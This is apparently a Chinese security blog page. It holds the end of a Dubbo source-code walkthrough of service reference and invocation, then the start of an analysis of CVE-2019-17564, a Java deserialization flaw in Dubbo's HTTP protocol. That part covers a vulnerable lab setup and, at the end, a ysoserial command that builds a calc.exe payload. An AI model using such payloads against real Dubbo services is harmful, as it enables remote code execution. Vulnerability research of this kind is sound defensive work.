<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913202725502.png" alt="image-20210913202725502"></p>
<h3 id="服务引用过程"><a href="#服务引用过程" class="headerlink" title="服务引用过程"></a>服务引用过程</h3><p>​        服务引用相当于生成了一个代理类，这个代理类可以给我们屏蔽远程调用的细节。</p>
<p>​        服务引用分为三种，即本地引用，远程引用和注册中心引用。</p>
<p>​        下面介绍来自<a href="https://blog.csdn.net/qq_35190492/article/details/108461885" target="_blank" rel="noopener">字节面试：dubbo的服务引用过程</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本地引入不知道大家是否还有印象，之前服务暴露的流程每个服务都会通过搞一个本地暴露，走 injvm 协议（当然你要是 scope &#x3D; remote 就没本地引用了），因为存在一个服务端既是 Provider 又是 Consumer 的情况，然后有可能自己会调用自己的服务，因此就弄了一个本地引入，这样就避免了远程网络调用的开销。</span><br><span class="line"></span><br><span class="line">直连远程引入服务，这个其实就是平日测试的情况下用用，不需要启动注册中心，由 Consumer 直接配置写死 Provider 的地址，然后直连即可。</span><br><span class="line"></span><br><span class="line">注册中心引入远程服务，这个就是重点了，Consumer 通过注册中心得知 Provider 的相关信息，然后进行服务的引入</span><br></pre></td></tr></table></figure>

<p>​        服务引用主要通过<code>ReferenceBean</code>来实现，这个类实现了FactoryBean接口，在spring容器初始化时会调用<code>ReferenceBean#getObject</code>方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913205047434.png" alt="image-20210913205047434"></p>
<p>​        <code>get</code>先调用<code>checkAndUpdateSubConfigs</code>检查属性值是否正确，再调用<code>init</code>完成服务引用。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913205302680.png" alt="image-20210913205302680"></p>
<p>​        <code>init</code>方法首先将很多信息封装到map中，再调用<code>createProxy</code>创建代理。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913205600010.png" alt="image-20210913205600010"></p>
<p>​            判断是否为本地调用，如果为本地调用，则调用<code>refprotocol.refer</code>创建一个InjvmInvoker对象返回。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913205929446.png" alt="image-20210913205929446"></p>
<p>​            判断url是否为空，不为空则判断是远程引用还是注册中心引用。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913210629008.png" alt="image-20210913210629008"></p>
<p>​            获取注册中心的地址，判断是否配置监控中心，如果没有则跳过，最后向url中加入refer参数。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210913211116652.png" alt="image-20210913211116652"></p>
<p>​        下面当url只有一个时则直接调用<code>prtocol.refer</code>生成invoker。如果有多个url则取最后一个registry的url作为registryURL，获取多个invoker添加到invokers中，并将invokers封装到StaticDirectory中，通过cluster封装为一个invoker，而这个invoker的地址为registryURL。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914092258934.png" alt="image-20210914092258934"></p>
<p>​        再看下<code>refprotocol.refer</code>是如何做的，由于我们使用的是registry协议，所以会调用<code>RegistryProtocol#refer</code>,首先获取url中的registry参数，并将参数的内容设置为url的协议名重新构造url，其次获取registry实例，如果要调用的接口名是RegistryService的实例，则直接构造Invoker返回，最后对group参数做处理，如果没有则直接调用<code>doRefer</code>完成核心的服务引用的逻辑。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914093935761.png" alt="image-20210914093935761"></p>
<p>​        <code>doRefer</code>首先创建了<code>RegistryDirectory</code>对象，RegistryDirectory 是一种动态服务目录，实现了 NotifyListener 接口。当注册中心服务配置发生变化后，RegistryDirectory 可收到与当前服务相关的变化。接下来构造consumer的url并注册到注册中心，通过<code>subscribe</code>订阅provider和router等服务，订阅了之后 RegistryDirectory 会收到这几个节点下的信息，触发Invoker的生成。最后通过cluster封装directory得到Invoker，将Consumer的信息添加到<code>ProviderConsumerRegTable</code>后返回Invoker。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914101227398.png" alt="image-20210914101227398"></p>
<p>​        现在主要关注<code>subscribe</code>订阅方法，订阅过程中会调用对应协议的refer方法，由于我们配置的是http协议，但<code>HttpProtocol</code>没有实现refer方法，因此会调用父类<code>AbstractProxyProtocol.refer</code>。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914102852897.png" alt="image-20210914102852897"></p>
<p>​        <code>AbstractProxyProtocol#refer</code>首先调用<code>HttpInvoker.doRefer</code>获取http调用客户端代理类对象，并通过<code>getInvoker</code>将代理类转换为Invoker，创建<code>AbstractInvoker</code>对象并实现doInvoke方法，在doInvoke中调用invoker.invoke方法，完成服务调用并获取返回结果。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914111156433.png" alt="image-20210914111156433"></p>
<p>​        <code>HttpInvoker.doRefer</code>创建了<code>HttpInvokerProxyFactoryBean</code>。</p>
<p>​        在spring中提供了HttpInvoker 通过HTTP协议实现RPC调用，Spring HttpInvoker使用Java序列化来序列化参数和返回值，然后基于HTTP协议传输经序列化后的对象。<code>Spring HttpInvoker</code>的服务端和客户端分别由<code>HttpInvokerServiceExporter</code>和<code>HttpInvokerProxyFactoryBean</code>实现。</p>
<p>服务端处理如下：</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914140905803.png" alt="image-20210914140905803"></p>
<p>客户端处理如下：</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914142047540.png" alt="image-20210914142047540"></p>
<p>​            创建<code>HttpInvokerProxyFactoryBean</code>对象后重写了<code>createRemoteInvocation</code>方法，根据不同的dubbo版本创建的不同的<code>RemoteInvocation</code>对象。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914114556775.png" alt="image-20210914114556775"></p>
<p>​            下面设置url和intercepte属性，并且创建了发送请求的客户端并封装到httpProxyFactoryBean中。创建<code>SimpleHttpInvokerRequestExcutor</code>对象并设置到<code>httpProxyFactoryBean</code>中。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914143424395.png" alt="image-20210914143424395"></p>
<p>​            下面调用<code>afterPropertiesSet</code>方法，创建<code>ProxyFactory</code>对象，通过<code>getProxy</code>获取AOP代理对象。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914143723921.png" alt="image-20210914143723921"></p>
<p>​        这里传入的interceptor是<code>HttpInvokerProxyFactoryBean</code>，这个Bean的父类<code>HttpInvokerClientInterceptor</code>继承了<code>MethodInterceptor</code>，因此这里相当于添加了一个环绕通知。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914192347578.png" alt="image-20210914192347578"></p>
<p>​        最后调用getObject实际上是返回<code>HttpProxyFactoryBean</code>的代理对象。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914143851670.png" alt="image-20210914143851670"></p>
<h3 id="服务调用过程"><a href="#服务调用过程" class="headerlink" title="服务调用过程"></a>服务调用过程</h3><p>​            服务调用是通过消费者的代理对象发起的，这个代理对象中包含了之前创建的服务引用。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914145531602.png" alt="image-20210914145531602"></p>
<p>​        查看<code>org.apache.dubbo.rpc.proxy.InvokerInvocationHandler#invoke</code>，封装调用的方法名和参数到<code>RpcInvocation</code>中，调用<code>MockClusterInvoker.invoke</code></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914160600831.png" alt="image-20210914160600831"></p>
<p>​        <code>org.apache.dubbo.rpc.cluster.support.wrapper.MockClusterInvoker#invoke</code>首先判断是否使用Mock机制，如果没有则调用<code>AbstractClusterInvoker.invoke</code></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914161157472.png" alt="image-20210914161157472"></p>
<p>​        <code>AbstractClusterInvoker.invoke</code>得到Invoker，初始化负载均衡调用<code>FailoverClusterInvoker.doInvoke</code></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914164347557.png" alt="image-20210914164347557"></p>
<p>​        <code>FailoverClusterInvoker.doInvoke</code>利用负载均衡策略选择一个invoker，并通过<code>RpcContext</code>记录调用过的Invoker,最后执行invoker的invoke方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914164911276.png" alt="image-20210914164911276"></p>
<p>​        回想一下服务引用的过程，真正执行请求的Invoker被封装为<code>AbstractInvoker</code>,所以会调用<code>AbstractInvoker.invoke</code>方法，设置invocation的invoker，并调用doInvoke方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914172239461.png" alt="image-20210914172239461"></p>
<p>​            我们实现的<code>AbstractProxyProtocol</code>重写了doInvoke方法，执行代理类的invoke方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914173300914.png" alt="image-20210914173300914"></p>
<p>​        这个代理类是<code>AbstractProxyInvoker</code>的实例，因此会调用<code>AbstractProxyInvoker.invoke</code></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914192727989.png" alt="image-20210914192727989"></p>
<p>​        在<code>AbstractProxyInvoker.invoke</code>调用了重写的<code>doInvoke</code>方法，也就是通过<code>wapper.invokeMethod</code>调用。也就是调用proxy的methodname方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914192838250.png" alt="image-20210914192838250"></p>
<p>​        由于我们添加了环绕通知，因此会调用<code>HttpInvokerClientInterceptor.invoke</code>执行调用请求。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914193337932.png" alt="image-20210914193337932"></p>
<p>​            在<code>HttpInvokerClientInterceptor#executeRequest</code>中获取executer并执行<code>executeRequest</code>方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914193634269.png" alt="image-20210914193634269"></p>
<p>​            由于我们之前服务引用在<code>HttpInvokerProxyFactoryBean</code>中设置的是<code>SimpleHttpInvokerRequestExecutor</code>，但<code>SimpleHttpInvokerRequestExecutor</code>中没有<code>executeRequest</code>，因此调用父类<code>AbstractHttpInvokerRequestExecutor.executeRequest</code>,在这个类中，将<code>RemoteInvocation</code>进行序列化后调用<code>SimpleHttpInvokerRequestExecutor#doExecuteRequest</code>完成请求发送。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914200306489.png" alt="image-20210914200306489"></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914200350526.png" alt="image-20210914200350526"></p>
<p>​        之前在服务导出时我们已经开启了tomcat服务并且创建了<code>internalHandler</code>设置到DispatcherServlet中，当接收到请求时，将通过<code>internalHandler.handle</code>处理请求。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914201638562.png" alt="image-20210914201638562"></p>
<p>​        获取<code>HttpInvokerServiceExporter</code>处理request请求。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914201705806.png" alt="image-20210914201705806"></p>
<p>​        通过<code>readRemoteInvocation</code>将传入的数据反序列化为<code>RemoteInvocation</code>对象，调用<code>invokeAndCreateResult</code>完成请求处理。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914201741834.png" alt="image-20210914201741834"></p>
<p>​        通过<code>RemoteInvocationBasedExporter.invoke</code>处理请求。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914201903323.png" alt="image-20210914201903323"></p>
<p>​        由于<code>HttpInvokerServiceExporter</code>没有invoke方法，因此会调用父类<code>DefaultRemoteInvocationExecutor</code>的invoke方法，调用<code>RemoteInvocation.invoke</code></p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914203608528.png" alt="image-20210914203608528"></p>
<p>​        最后调用<code>RemoteInvocation#invoke</code>，通过反射执行方法。</p>
<p><img src="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210914203828393.png" alt="image-20210914203828393"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        第一次对框架的源码进行分析，可能有一些地方没有分析清楚，不过了解到这种程度对于分析漏洞应该够用了。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a href="https://dubbo.apache.org/zh/docs/" target="_blank" rel="noopener">https://dubbo.apache.org/zh/docs/</a></li>
<li><a href="https://blog.csdn.net/qq_35190492/article/details/108461885" target="_blank" rel="noopener">https://blog.csdn.net/qq_35190492/article/details/108461885</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Dubbo漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-09-08 13:47:32" itemprop="dateCreated datePublished" datetime="2021-09-08T13:47:32+08:00">2021-09-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-15 16:27:46" itemprop="dateModified" datetime="2021-09-15T16:27:46+08:00">2021-09-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前审计的过程中，遇到过Dubbo这个组件，虽然知道这个组件存在反序列化漏洞，但是关于漏洞的详情和利用一概不知，所以下面对Dubbo的漏洞进行分析。</p>
<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>​        Dubbo是一款开源的RPC和微服务治理的框架，最早是阿里开发的后来归到了Apache下面，支持多种协议，比如gRPC、Thrift、JsonRPC、Hessian2、REST、RMI、HTTP。</p>
<p>​        下面是官网对于Dubbo架构的介绍。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909112048090.png" alt="image-20210909112048090"></p>
<p>​    主要包含<code>消费者</code>、<code>服务提供者</code>、<code>注册中心</code>、<code>监控中心</code>、<code>容器</code>等等。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909112713522.png" alt="image-20210909112713522"></p>
<p>​    provider在启动时会将服务注册到注册中心，consumer在使用时会从注册中心获取到已经注册的服务，再根据consumer中配置的路由决定调用哪个服务，consumer通过RPC协议调用provider的服务并获取返回结果。</p>
<h3 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE-2019-17564"></a>CVE-2019-17564</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>​        github下载官方提供的<code>https://github.com/apache/dubbo-samples</code>项目，导入simple-http。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909134909810.png" alt="image-20210909134909810"></p>
<p>​        直接下载的项目跑不起来，要更改<code>http-provider.xml</code>和<code>http-consumer.xml</code>的内容。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">"http://code.alibabatech.com/schema/dubbo"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo</span></span></span><br><span class="line"><span class="tag"><span class="string">http://code.alibabatech.com/schema/dubbo/dubbo.xsd"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909135032905.png" alt="image-20210909135032905"></p>
<p>​        由于漏洞影响的版本为2.7.3所以要更改pom.xml的配置，注意是在dependency下面新增一个version标签，<code>&lt;version&gt;2.7.3&lt;/version&gt;</code>。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909135127465.png" alt="image-20210909135127465"></p>
<p>​        还有坑点，原本的配置是用<code>${}</code>包含配置文件的，但是低版本解析过程并没有解析<code>${}</code>中的内容，所以要进行更改。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909152940873.png" alt="image-20210909152940873"></p>
<p>​        更改后<code>zookeeper</code>更改后如下，<code>port</code>和<code>server</code>的参数更改类似。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909153148030.png" alt="image-20210909153148030"></p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909153121415.png" alt="image-20210909153121415"></p>
<p>​        下面依次启动zookeeper，provider和Consumer即可，调试好后可以添加低版本的CC依赖，可以直观的看到利用结果。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>​        在漏洞分析前我们还要再铺垫一些前置知识，provider在导出服务并注册到注册中心zookeeper时，实际上注册的是一个URL地址，但是这个URL并不是<code>java.net.URL</code>而是Dubbo自定义的URL，包含了下面几个属性。</p>
<ul>
<li><p>protocol：一般是 dubbo 中的各种协议 如：dubbo thrift http zk</p>
</li>
<li><p>username/password：用户名/密码</p>
</li>
<li><p>host/port：主机/端口</p>
</li>
<li><p>path：接口名称</p>
</li>
<li><p>parameters：参数键值对</p>
<p>​    下面是URL的一些栗子。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dubbo:&#x2F;&#x2F;192.168.1.6:20880&#x2F;moe.cnkirito.sample.HelloService?timeout&#x3D;3000</span><br><span class="line">zookeeper:&#x2F;&#x2F;127.0.0.1:2181&#x2F;org.apache.dubbo.registry.RegistryService?application&#x3D;demo-consumer&amp;dubbo&#x3D;2.0.2&amp;interface&#x3D;org.apache.dubbo.registry.RegistryService&amp;pid&#x3D;1214&amp;qos.port&#x3D;33333&amp;timestamp&#x3D;1545721981946</span><br></pre></td></tr></table></figure>

<p>​        其中访问的path可以在dubbo service的bean配置中通过path属性进行设置，如果没有设置，则默认使用interface的名称当作path。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910105505997.png" alt="image-20210910105505997"></p>
<p>​        同样，由于Dubbo在进行RPC调用时支持多种协议，也可以在Bean配置中通过<code>protocol</code>的<code>name</code>属性进行配置，由于<code>CVE-2019-17564</code>是Dubbo以http协议通信时出现的问题，因此我们这里配置也使用http的方式。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"http"</span> <span class="attr">id</span>=<span class="string">"http"</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">server</span>=<span class="string">"tomcat"</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        通过上面的配置，假如我们要访问<code>DemoService</code>服务，可以通过下面的url访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;org.apache.dubbo.samples.http.api.DemoService</span><br></pre></td></tr></table></figure>

<p>​        现在我们再回到这个漏洞本身，通过官网的介绍Dubbo在实现http协议时使用的是spring的HttpInvoker来实现的。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915115832578.png" alt="image-20210915115832578"></p>
<p>​        我们再来了解HttpInvoker的介绍，其实现是基于标准的Java的序列化和反序列化机制，这里之所以要通过序列化和反序列化来实现，是因为在进行RPC调用时，调用的参数和返回值不一定是基本类型，也有可能是对象，而对象的传递肯定是要基于序列化和反序列，值得一提的是Dubbo在实现RPC调用时，会将我们要调用的方法和参数封装到<code>RemoteInvocation</code>对象中，服务端再接收到请求后，会将请求的内容反序列化为<code>RemoteInvocation</code>对象再去做其他操作，当我们了解了这些以后，即使不去看实现也能想到，在服务端provider接收到请求并进行反序列化时可能出现反序列化漏洞。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915120037799.png" alt="image-20210915120037799"></p>
<h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><p>​        之前在分析Dubbo源码时已经分析了Http请求的处理过程，这里就不仔细分析了，把重点的代码说明一下即可。在<code>org.springframework.remoting.httpinvoker.AbstractHttpInvokerRequestExecutor#executeRequest</code>中，会对<code>RemoteInvocation</code>对象进行序列化。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915134000020.png" alt="image-20210915134000020"></p>
<p>​        在<code>RemoteInvocation</code>对象中封装了调用的方法名、请求参数类型、参数值等信息。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915134055775.png" alt="image-20210915134055775"></p>
<p>​        下面通过<code>org.springframework.remoting.httpinvoker.SimpleHttpInvokerRequestExecutor#doExecuteRequest</code>发送请求，<code>prepareConnection</code>主要完成请求发送前的一些设置。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915134326504.png" alt="image-20210915134326504"></p>
<p>​        在<code>org.springframework.remoting.httpinvoker.SimpleHttpInvokerRequestExecutor#prepareConnection</code>中可以看到通过<code>POST</code>发送请求。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915134410725.png" alt="image-20210915134410725"></p>
<p>​        <code>writeRequestBody</code>中将序列化的<code>RemoteInvocation</code>对象作为post请求的内容发送给服务端。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915134603620.png" alt="image-20210915134603620"></p>
<h5 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h5><p>​        当请求过来时，交给DispatcherServlet会将请求交给<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#handleRequest</code>处理，这个方法会通过<code>readRemoteInvocation</code>将request中的内容转换为<code>RemoteInvocation</code>对象。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915134928830.png" alt="image-20210915134928830"></p>
<p>​        获取request对象中的请求内容，在<code>doReadRemoteInvocation</code>中通过<code>readObject</code>反序列化,如果反序列化的对象不是RemoteInvocation对象则抛出异常。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915135352990.png" alt="image-20210915135352990"></p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915135507598.png" alt="image-20210915135507598"></p>
<p>​        通过上面的分析，我们可以看出Dubbo Provider服务端在执行Consumer过来的请求时直接从<code>POST</code>中获取对象并进行反序列化，在反序列化之前并没有做其他安全的判断，所以我们以<code>POST</code>发送任意一个对象到Provider都会被反序列化，如果我们传入一个特殊构造的对象，Provider反序列化后则有可能造成命令执行或其他操作。</p>
<p><strong>是不是一定要知道要调用的Provider提供服务的method和参数才能触发反序列化？</strong></p>
<p>​        这里需要了解服务导出的操作,我是以Tomcat做为服务端的，可以看到在构造Tomcat服务器时，添加了<code>ServletMapping</code>为<code>*</code>，也就是所有的请求都会被我们注册的handler处理。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915140614106.png" alt="image-20210915140614106"></p>
<p>​        但是在<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle</code>中会做如下处理。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915141019389.png" alt="image-20210915141019389"></p>
<p>​        首先获取请求uri并判断是否能找到对应的<code>Exporter</code>处理，如果找不到则会导致异常，<code>SkeletonMap</code>中保存的路径如果没有在provider的service元素中配置path属性，则默认使用interface的内容。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915141146132.png" alt="image-20210915141146132"></p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915141347876.png" alt="image-20210915141347876"></p>
<p>​        <strong>所以并不是访问服务端的任意接口都能触发漏洞的</strong>。</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>​        漏洞复现就比较简单了，首先生成EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar e:\tools\ysoserial.jar CommonsCollections4 &quot;calc.exe&quot; &gt; c:\users\admin\desktop\payload.ser</span><br></pre></td></tr></table></figure>

